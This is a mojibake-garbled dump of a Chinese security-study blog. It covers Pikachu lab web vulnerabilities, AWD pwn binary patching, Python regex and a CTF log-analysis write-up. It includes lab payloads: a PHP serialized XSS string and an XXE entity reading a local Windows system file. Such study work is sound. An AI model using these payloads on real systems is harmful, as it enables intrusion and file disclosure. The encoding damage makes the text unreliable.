é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚\n\nä»»æ„æ–‡ä»¶è¯»å–,ç›´æ¥ç›¸å¯¹è·¯å¾„è¯»åˆ°\næ•æ„Ÿä¿¡æ¯æ³„éœ²\næ•æ„Ÿä¿¡æ¯æ³„éœ²æ¦‚è¿°\nç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼šâ€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;\nç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚\n\n\nç›´æ¥ç›¸å¯¹ç›®å½•è¯»ä¸€ä¸‹\nPHPååºåˆ—åŒ–\nåœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚\nåºåˆ—åŒ–serialize()åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:\nclass S &#123;    public $test=&#x27;pikachu&#x27;;&#125;$s = new S(); //åˆ›å»ºä¸€ä¸ªå¯¹è±¡serialize($s); //æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–//è¿è¡Œç»“æœ O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;O: ä»£è¡¨object1: ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦S: å¯¹è±¡åç§°1: ä»£è¡¨å¯¹è±¡é‡Œæœ‰ä¸€ä¸ªå˜é‡s: æ•°æ®ç±»å‹4: å˜é‡åç§°é•¿åº¦test: å˜é‡åç§°s: æ•°æ®ç±»å‹7: å˜é‡å€¼é•¿åº¦pikachu: å˜é‡å€¼\n\nååºåˆ—åŒ–unserialize()\nå°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚\n$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);echo $u-&gt;test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu   \n\nåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜\nå¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__dostruct() å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨æ¼æ´ä¸¾ä¾‹:class S&#123;    var $test = &quot;pikachu&quot;;    function __destruct()&#123;        echo $this -&gt; test;    &#125;&#125;$s = $__GET[&#x27;test&#x27;];@$unser = unserialize($a)    //payload: O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n\næˆ‘ä»¬ç¿»é˜…ä¸€ä¸‹è¿™é¢˜çš„æºä»£ç \n\næœ€ç»ˆä»£ç æˆåŠŸåˆ©ç”¨ä¸å¦æç°åœ¨å‰ç«¯,ç´¢æ€§æˆ‘ä»¬å°±æ•ˆä»¿ä¸Šè¾¹ç”Ÿæˆä¸€ä¸²xss\n&lt;?phpclass S &#123;    public $test=&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;;&#125;$s = new S();echo serialize($s);?&gt;\n\n\nXXE\nXXE -â€œxml external entity injectionâ€æ—¢â€xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€ã€‚æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯â€æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜â€ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚\nå…·ä½“çš„å…³äºxmlå®ä½“çš„ä»‹ç»,ç½‘ç»œä¸Šæœ‰å¾ˆå¤š,è‡ªå·±åŠ¨æ‰‹å…ˆæŸ¥ä¸€ä¸‹ã€‚ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚\næœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚\n\næˆ‘ä»¬é¦–å…ˆä½¿ç”¨\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe  &quot;Charmersix&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\nå‘ç°åœ¨æœ¬åœ°æ˜¯æœ‰å›æ˜¾çš„, è¿™æ—¶å€™æˆ‘ä»¬å¼€å§‹å¤–éƒ¨æ³¨å…¥,è¯•ç€è®¿é—®ä¸€ä¸‹æˆ‘ä»¬ç”µè„‘çš„win.iniæ–‡ä»¶(fileåè®®åªèƒ½ç»å¯¹è·¯å¾„è¯»å–)\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\n\né‚£ä¹ˆæˆ‘ä»¬å¦‚æœä¿®æ”¹ä¸€ä¸‹æºç å‘¢\n\nå…ˆåˆ æ‰LIBXML_NOENTè¯•ä¸€è¯•\næˆ‘ä»¬å¯ä»¥å‘ç°Charmersixä»ç„¶å¯ä»¥å›æ˜¾,ä½†æ˜¯æ²¡æ³•å›æ˜¾win.iniå†…å®¹äº†\n\nURLé‡å®šå‘\nä¸å®‰å…¨çš„urlè·³è½¬\nä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯å°±å¯èƒ½å‘ç”Ÿâ€è·³é”™å¯¹è±¡â€çš„é—®é¢˜ã€‚\nurlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:â€“&gt;é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™\nè¿™ä¸ªæ¼æ´æ¯”è¾ƒç®€å•,come on,æ¥æµ‹ä¸€æŠŠ!\n\n\næˆåŠŸè·³è½¬åˆ°myblog\nSSRF\nSSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )\nå…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶\nå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®\næ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€\næ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·\nPHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:file_get_contents()fsockopen()curl_exec()\n\n\nå¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(â€œæˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚â€)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚\nä½ å¯ä»¥æ ¹æ®â€SSRFâ€é‡Œé¢çš„é¡¹ç›®æ¥ææ‡‚é—®é¢˜çš„åŸå› \n\nSSRF(curl)é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ•ˆä»¿ä¸Šä¸€é¢˜,é€šè¿‡httpåè®®,urlé‡å®šå‘åˆ°å…¶ä»–é¡µé¢\næˆ‘ä»¬ä¹Ÿå¯ä»¥æ•ˆä»¿ä¸Šä¸Šä¸ªæ¼æ´,é€šè¿‡fileåè®®è¯»å–ä¸€äº›æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶\n\næˆ–è€…æ˜¯åƒè¿™æ ·\nSSRF(file_get_contents)ä»ç„¶å¯ä»¥\nå…¨å‰§ç»ˆ","tags":["Web","study","pikachu"]},{"title":"Pwn_patch","url":"/2023/06/21/pwn_patch/","content":"æ­¤ç¯‡å‚è€ƒåˆå¤©ç½‘å®‰å®éªŒå®¤çš„è¿™ç¯‡æ–‡ç« \nIDAå®‰è£…keypatchæ’ä»¶ä¸‹è½½åœ°å€:https://github.com/keystone-engine/keypatch\npip install keystone-enginepip install six\n\n\nå°†keypatch.pyæ–‡ä»¶å¤åˆ¶åˆ° IDAçš„pluginsæ–‡ä»¶å¤¹ä¸‹ï¼Œé‡å¯IDA\n\nå®‰è£…æˆåŠŸ\nè·³è½¬æŒ‡ä»¤æ— ç¬¦å·è·³è½¬\n\n\næ±‡ç¼–æŒ‡ä»¤\næè¿°\n\n\n\nJA\næ— ç¬¦å·å¤§äºåˆ™è·³è½¬\n\n\nJNA\næ— ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬\n\n\nJAE\næ— ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJNBï¼‰\n\n\nJNAE\næ— ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJBï¼‰\n\n\nJB\næ— ç¬¦å·å°äºåˆ™è·³è½¬\n\n\nJNB\næ— ç¬¦å·ä¸å°äºåˆ™è·³è½¬\n\n\nJBE\næ— ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJNAï¼‰\n\n\nJBNE\næ— ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJAï¼‰\n\n\næœ‰ç¬¦å·è·³è½¬\n\n\næ±‡ç¼–æŒ‡ä»¤\næè¿°\n\n\n\nJG\næœ‰ç¬¦å·å¤§äºåˆ™è·³è½¬\n\n\nJNG\næœ‰ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬\n\n\nJGE\næœ‰ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJNLï¼‰\n\n\nJNGE\næœ‰ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJLï¼‰\n\n\nJL\næœ‰ç¬¦å·å°äºåˆ™è·³è½¬\n\n\nJNL\næœ‰ç¬¦å·ä¸å°äºåˆ™è·³è½¬\n\n\nJLE\næœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJNGï¼‰\n\n\nJNLE\næœ‰ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒJGï¼‰\n\n\nPatch-æ•´æ•° æº¢å‡º\nscanfä»¥long inté•¿æ•´å½¢è¯»å–è¾“å…¥åˆ°unsigned intå˜é‡v2ä¸­, ç„¶åå°†v2å¼ºåˆ¶è½¬åŒ–ä¸ºintå†ä¸int 48æ¯”è¾ƒ\nä½†ä»scanfè¯»å…¥ä¸€ä¸ªè´Ÿæ•°æ—¶, æœ€é«˜ä½ä¸º1, ä»unsigned intå¼ºåˆ¶è½¬æ¢ä¸ºintç»“æœæ˜¯è´Ÿæ•°, å¿…å®šæ¯”48å°, åœ¨åé¢readè¯»å…¥ä¼šé€ æˆæ ˆæº¢å‡º\næ–¹æ³•å°†ç¬¬ä¹è¡Œçš„ifè·³è½¬æ±‡ç¼–æŒ‡ä»¤patchä¸ºæ— ç¬¦å·çš„è·³è½¬æŒ‡ä»¤, å…·ä½“å‚è€ƒè·³è½¬æŒ‡ä»¤è¡¨\nä½¿ç”¨keypatchè¿›è¡Œä¿®æ”¹\njle--&gt;jbe\n\npatch-æ ˆæº¢å‡º\nå¯¹äºæ ˆæº¢å‡ºåŠ å›ºï¼Œx64 æ›´å®¹æ˜“ä¸€äº›ï¼Œå› ä¸ºæ˜¯ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œè€Œx86 ä½¿ç”¨æ ˆä¼ å‚ï¼Œéœ€è¦ç”¨ nop ç­‰ä¿æŒåŠ å›ºå‰åçš„ç©ºé—´ä¸å˜\n\nx64\næ–¹æ³•100æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°, å­˜å‚¨å¯„å­˜å™¨æ˜¯rdx, æ‰¾åˆ°ç»™rdxä¼ å‚çš„æ±‡ç¼–æŒ‡ä»¤è¿›è¡Œpatch\nä½¿ç”¨idaé»˜è®¤ä¿®æ”¹æ’ä»¶ä¿®æ”¹(Edit-Patch Program-Change word), ä¹Ÿå¯ä»¥ä½¿ç”¨keypatch\n\n0x64 æ˜¯é•¿åº¦\n0xBA æ˜¯æ“ä½œç¬¦\n\n\n0x64-&gt;0x20\n\n\nx86ä¸éœ€è¦å¯¹é½\næ‰¾åˆ°å‹æ ˆçš„æŒ‡ä»¤, ä¿®æ”¹å‹å…¥çš„æ•°å€¼\n\n\n\nä¿®æ”¹æ•°å€¼éœ€è¦è¡¥ä¸Š 0x\nè¿™é‡Œä¿®æ”¹å‰ size ä¸º 2 ï¼Œä¿®æ”¹å size ä¹Ÿä¸º 2 ï¼Œæ‰€ä»¥è¿™é¢˜ patch ä¸éœ€è¦ç”¨ nop ä¿æŒ size\n\néœ€è¦å¯¹é½\næ‰¾åˆ°å‹æ ˆçš„æŒ‡ä»¤, ä¿®æ”¹å‹å…¥çš„æ•°å€¼\n\n\nç›´æ¥ä¿®æ”¹0x20å, size é•¿åº¦ä¸å¯¹é½, ä¼šå¼•èµ·æ ˆç©ºé—´å˜åŒ–, éœ€è¦ç”¨nopè¿›è¡Œå¯¹é½\n\n\næ›´æ–¹ä¾¿å¿«æ·çš„æ–¹æ³•æ˜¯å‹¾é€‰NOPs padding until next instruction boundaryè¿›è¡Œè‡ªåŠ¨å¡«å……\npatch-æ ¼å¼åŒ–å­—ç¬¦ä¸²\nä¿®æ”¹å‡½æ•°å°†printfæ”¹ä¸ºputs, å°†callçš„åœ°å€æ”¹ä¸ºputs pltåœ°å€:\n\n\nè¿™ä¸ªæ–¹æ³•å±€é™æ€§åœ¨äº: putsä¼šåœ¨åŸå­—ç¬¦ä¸²å¤šåŠ \\n, ä¸»åŠæ–¹checkå¯èƒ½å› æ­¤è€Œä¸é€šè¿‡\nä¿®æ”¹printfå‚æ•°\nå°†printf(format)ä¿®æ”¹ä¸º`printf(â€œ%sâ€,format)\nä¿®æ”¹printfå‰é¢çš„ä¼ å‚æŒ‡ä»¤:\n\nmov edi, offset 0x400c01; mov esi,offset format;\n\n\npatch-UAF\nä¿®æ”¹é€»è¾‘æ˜¯åŠ«æŒcallæŒ‡ä»¤è·³è½¬åˆ°.eh_frameæ®µä¸Šå†™å…¥çš„è‡ªå®šä¹‰æ±‡ç¼–ç¨‹åº\nå…ˆåœ¨.eh_frameæ®µä¸Šå†™å…¥ä»£ç , é¦–å…ˆæ˜¯call freeå®Œæˆé‡Šæ”¾, ç„¶åå¯¹chunk_listè¿›è¡Œç½®é›¶. å–chunk_liståœ°å€çš„æ±‡ç¼–å¯ä»¥ä»call freeå‰é¢æŠ„è¿‡æ¥\ncall 0x900;           #è°ƒç”¨freeå‡½æ•°ï¼ˆpltåœ°å€ï¼‰  mov     eax, [rbp-0xc]; #å–å‡ºä¸‹æ ‡å€¼cdqe;lea     rdx, ds:0[rax*8];lea rax, qword ptr [heap];  mov r8,0; #æ®µåœ°å€ä¸èƒ½ç›´æ¥èµ‹äºˆç«‹å³æ•°mov [rdx+rax],r8;jmp 0xD56; #è·³å›åŸæ¥çš„åœ°å€\n\n\npatch-ifèŒƒå›´å‡è®¾éœ€è¦å°†å›¾ä¸Šç¬¬äºŒä¸ªifæ”¾åˆ°ifç»“æ„å†…, ä¿®æ”¹è·³è½¬çš„åœ°å€å³å¯:\n\nåŸå§‹è·³è½¬ä»£ç :\n\njs 0x40081C --&gt; js 0x400845\n\n\npatch-æ›´æ¢å±é™©å‡½æ•°\nç±»ä¼¼ä¸ uaf ä¸€æ ·å†™æ±‡ç¼–å®ç°åŠŸèƒ½è°ƒç”¨ï¼Œå°†å±é™©å‡½æ•°æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰ç›®æ ‡å‡½æ•°ï¼Œå°±é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ–¹å¼è°ƒç”¨ã€‚\nå°† gets æ›¿æ¢ä¸º read è¾“å…¥\n\n.eh_frameå†™å…¥æ±‡ç¼–ï¼Œå°† rdi çš„å†™å…¥åœ°å€ç§»åŠ¨åˆ° rsi ï¼ŒæŠŠå…¶ä»–å¯„å­˜å™¨ä¹Ÿä¼ å‚ä¹‹åè¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼š\n\n\n\npwné€šé˜²å°å·¥å…·æ³¨æ„: è¿™é‡Œç”±äºç¼–è¯‘æ–¹å¼ä¸åŒçš„åŸå› , ä½œè€…å†™çš„å·¥å…·ç›®å‰ä»…é€‚é…Ubuntu16;18;20\nåŸºäºpwntoolså’Œseccomp-toolsçš„awd pwné€šé˜²å°å·¥å…·, åŸåˆ›åœ¨è¿™\nGitHubåœ°å€: https://github.com/TTY-flag/evilPatcher\nç¯å¢ƒéœ€è¦ è¿è¡Œéœ€è¦ä¾èµ–seccomps-toolså’Œpwntools\npwntoolså®‰è£…\nè¿™é‡Œè¦åœ¨python2ä¸‹å®‰è£…,å› ä¸ºå·¥å…·æ˜¯åŸºäºpython2çš„\nsudo apt install python2sudo apt install python2curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.pysudo python2 get-pip.pysudo python2 -m pip install pwntools\n\nseccomps-toolså®‰è£…\nsudo gem install seccomp-tools#å¦‚æœåœ¨ç¼–è¯‘æ—¶å¤±è´¥ï¼Œè¯·å°è¯•ï¼šsudo apt install gcc ruby-dev\n\ntestç»“æŸåæˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªpwné¢˜è¯•ä¸€ä¸‹\npython2 exp1.pycat flag.txt\n\n\nç„¶å\npython2 evilPatcher.py pwn1 sandboxs/mini_sandbox.asm 1\n\nè¯•ä¸€ä¸‹é€šé˜²è„šæœ¬\n\nç”Ÿæˆåçš„pwn1.patchä¿®æ”¹ä¸ºpwn1, å†è¿è¡Œä¸€ä¸‹exp\npython2 exp1.pycat flag.txt\n\næˆåŠŸ!\n\n","tags":["Study","Pwn","patch","awd"]},{"title":"python reæ¨¡å—","url":"/2022/05/03/python%20re/","content":"åˆè¯†re\nfindallfindall : åŒ¹é…å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„ç¬¦åˆæ­£åˆ™å†…å®¹\nimport relist = re.findall(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(list)\n\nfinditerfinditer : åŒ¹é…å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å†…å®¹ï¼ˆè¿”å›çš„æ˜¯è¿­ä»£å™¨ï¼‰;ä»è¿­ä»£å™¨é‡Œæ‹¿åˆ°å†…å®¹éœ€è¦.group()\nimport reit = re.finditer(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)for i in it :    print(i.group())\n\nsearchsearch : æ‰¾åˆ°ä¸€ä¸ªç»“æœå°±è¿”å›ï¼Œè¿”å›ç»“æœæ˜¯matchå¯¹è±¡ï¼Œéœ€è¦.group()\nimport res = re.search(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(s.group())\n\nmatchmatch : ä»å¤´å¼€å§‹åŒ¹é…\nimport rem = re.match(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(m.group())\n\né¢„åŠ è½½æ­£åˆ™è¡¨è¾¾å…ˆæ­£åˆ™åŒ¹é…ï¼Œå†re\nimport reobj = re.compile(r&quot;\\d+&quot;)ret =  obj.finditer(&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)for it in ret :     print(it.group())\n\nä¸€ä¸ªé²œæ˜çš„é¢„åŠ è½½ä¾‹å­import rea = &quot;&quot;&quot;&lt;div class= &#x27;jay&#x27;&gt;&lt;span id= &#x27;1&#x27;&gt;éƒ­éº’éºŸ&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;jj&#x27;&gt;&lt;span id= &#x27;2&#x27;&gt;éƒ­å¾·çº²&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;mike&#x27;&gt;&lt;span id= &#x27;3&#x27;&gt;äºè°¦&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;jack&#x27;&gt;&lt;span id= &#x27;4&#x27;&gt;å²³äº‘é¹&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;#  (?P&lt;åˆ†ç»„åå­—&gt;æ­£åˆ™) å¯ä»¥å•ç‹¬ä»æ­£åˆ™åŒ¹é…å†…å®¹ä¸­æå–æ‰€éœ€obj = re.compile(r&quot;&lt;div class= &#x27;(?P&lt;english&gt;.*?)&#x27;&gt;&lt;span id= &#x27;(?P&lt;id&gt;\\d+)&#x27;&gt;(?P&lt;å¾·äº‘ç¤¾&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;, re.S)#è®©. èƒ½åŒ¹é…åˆ°æ¢è¡Œç¬¦result = obj.finditer(a)for it in result :    print(it.group(&quot;english&quot;))    print(it.group(&quot;id&quot;))    print(it.group(&quot;å¾·äº‘ç¤¾&quot;))\n\n","tags":["python"]},{"title":"(é™‡å‰‘æ¯ 2021)æ—¥å¿—åˆ†æç³»åˆ—","url":"/2022/05/24/rizhifenxi/","content":"è¿™ä¸€ç³»åˆ—ä¸€å…±æœ‰ä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯æ—¥å¿—åˆ†æçš„ä¸‰ä¸ªé¢˜ç›®ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ç®€å•çš„æ—¥å¿—åˆ†æ\næ—¥å¿—åˆ†æï¼ˆ1ï¼‰è¿™é¢˜è®©æ‰¾æºç æ–‡ä»¶ï¼Œæ ¹æ®ç»éªŒï¼Œæºç ä¸€èˆ¬æ”¾åœ¨www/wwwrootä¸‹è¾¹\nç›´æ¥CTRL+Fæ‰¾ä¸€ä¸‹ï¼Œæœç„¶æœ‰ã€‚\n\nï¼ˆ2ï¼‰ä¸€çœ¼é¡¶é’ˆ\n\nè§£ç çœ‹çœ‹\n\nè¿™ä¸å¾ˆæ˜æ˜¾sess_car\nï¼ˆ3ï¼‰ä»ï¼ˆ2ï¼‰èƒ½çœ‹å‡ºä¸€æ®µååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç±»è‡ªç„¶å°±æ˜¯SplFileObject\nç®€å•æ—¥å¿—åˆ†æï¼ˆ1ï¼‰æ‰“å¼€æµè§ˆä¸€ä¸‹\n\nå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œåƒæäº†base64\nè§£ç 